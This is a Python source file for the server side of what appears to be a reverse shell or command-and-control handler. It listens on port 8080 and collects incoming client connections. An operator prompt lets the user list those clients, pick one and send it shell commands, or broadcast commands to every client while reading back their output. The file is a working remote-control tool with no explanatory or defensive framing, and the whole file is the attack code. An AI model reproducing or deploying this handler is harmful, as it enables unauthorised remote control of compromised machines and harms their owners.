import socket
import threading
from sys import exit
from queue import Queue

NUMBEROFTHREADS = 2
TASKNUMBER = [1, 2]
queue = Queue()
allConnections = []
allAddresses = []

host = ''
port = 8080

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
def setupConnection():
    try:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((host, port))
        s.listen(1)
    except socket.error as errorMsg:
        print(errorMsg)
        setupConnection()

def acceptConnections():
    for connection in allConnections:
        connection.close()
    del allConnections[:]
    del allAddresses[:]
    while True:
        try:
            connection, address = s.accept()
            connection.setblocking(1)
        except Exception as e:
            print(e)
            continue
        allConnections.append(connection)
        allAddresses.append(address)
        print("Connections has been established | IP: " + address[0] + " | Port: " + str(address[1]))

def startCmd():
    while True:
        cmd = input('server > ')
        if cmd == 'list':
            listConnections()
        elif 'select' in cmd:
            target, connection = getTarget(cmd)
            if connection is not None:
                sendCommand(target, connection)
        elif cmd == 'broadcast':
            sendBroadcast()
        elif cmd == 'quit':
            exit(0)
        else:
            print('Indefined command!')


def listConnections():
    results = ''
    for i, connection in enumerate(allConnections):
        try:
            connection.send(str.encode('here?'))
            check = connection.recv(1024)
            if check.decode('utf-8') == 'yes':
                results += str(i) + ' | ' + str(allAddresses[i][0]) + ' | ' + str(allAddresses[i][1]) + '\n'
        except Exception as e:
            del allConnections[i]
            del allAddresses[i]
            continue

    print('Connected Clients:\n' + '#   |  IP Address  |   Port number\n' +results)

def getTarget(cmd):
    try:
        target = int(cmd.split(' ')[1])
        connection = allConnections[target]
        print("you are now connected to " + str(allAddresses[target][0]))
        print(str(allAddresses[target][0]) + '> ', end='')
        return target, connection
    except Exception as e:
        print(e)
        return None, None

def sendCommand(target, connection):
    while True:
        cmd = input()
        if cmd == 'quit':
            break
        if cmd == ':wq':
            connection.close()
            s.close()
            del allConnections[target]
            del allAddresses[target]
            break
        if len(str.encode(cmd)) > 0:
            connection.send(str.encode(cmd))
            response = str(connection.recv(1024).decode('utf-8'))
            print(response, end='')

def sendBroadcast():
    while True:
        cmd = input('Broadcast message > ')
        if cmd == 'quit':
            break
        for i, connection in enumerate(allConnections):
            if len(str.encode(cmd)) > 0:
                connection.send(str.encode(cmd))
                response = str(connection.recv(1024).decode('utf-8'))
                print(response)

def createThreads():
    for _ in range(NUMBEROFTHREADS):
        thread = threading.Thread(target = task)
        thread.daemon = True
        thread.start()

def createTasks():
    for i in TASKNUMBER:
        queue.put(i)
    queue.join()

def task():
    while True:
        i = queue.get()
        if i == 1:
            setupConnection()
            acceptConnections()
        elif i == 2:
            startCmd()
        queue.task_done()

def main():
    createThreads()
    createTasks()

if __name__ == '__main__':
    main()
